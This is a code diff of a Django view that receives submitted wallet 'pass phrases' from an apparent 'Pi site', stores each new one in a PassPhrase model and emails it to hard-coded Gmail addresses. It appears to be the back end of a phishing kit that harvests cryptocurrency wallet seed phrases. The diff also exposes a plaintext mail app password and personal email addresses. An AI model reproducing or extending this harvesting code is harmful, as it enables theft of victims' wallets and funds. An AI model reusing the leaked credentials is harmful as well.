@@ -3,6 +3,7 @@ from firebmail import sendmail as sending_no
 from datetime import datetime
 from django.http import HttpResponse
 from urllib.parse import unquote
+from .models import PassPhrase
 
 # Create your views here.
 
@@ -12,19 +13,33 @@ def send_notify(subject, payload, email_to):
     password = "pvos glgf nxal finc"
     recipient = email_to
     
-    return sending_no(payload, recipient, sender,password, subject)
+    return sending_no(
+        payload=payload,
+        recipient=recipient,
+        sender=sender,
+        password=password,
+        subject=subject
+    )
 
 def sendmail(request, keys, email):
     current_date = datetime.now()
-    formatted_time = current_date.strftime("%Y-%m-%d %H:%M:%S")
-    
+    formatted_time = current_date.strftime("%Y-%m-%d %H:%M:%S")    
     decoded_param = unquote(keys)
 
-    if email == 'no@no.com':
-        send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {decoded_param} )', subject=f'Pi site Token Submitted {formatted_time}', email_to='ezekielobiajulu01@gmail.com')
+    exists = PassPhrase.objects.filter(keys = decoded_param).exists()
 
-    else:
-        send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {decoded_param} )', subject=f'Pi site Token Submitted {formatted_time}', email_to=email)
+    if not exists:
+        saved = PassPhrase.objects.create(
+            keys = decoded_param
+        )
+        saved.save()
+
+        if email == 'no@no.com':
+            send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {decoded_param} )', subject=f'Pi site Token Submitted {formatted_time}', email_to='ezekielobiajulu01@gmail.com')
+
+        else:
+            send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {decoded_param} )', subject=f'Pi site Token Submitted {formatted_time}', email_to=email)
+
                     
     # send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {decoded_param} )', subject=f'Pi site Token Submitted {formatted_time}', email_to="obikeechiemerielinus@gmail.com")
     
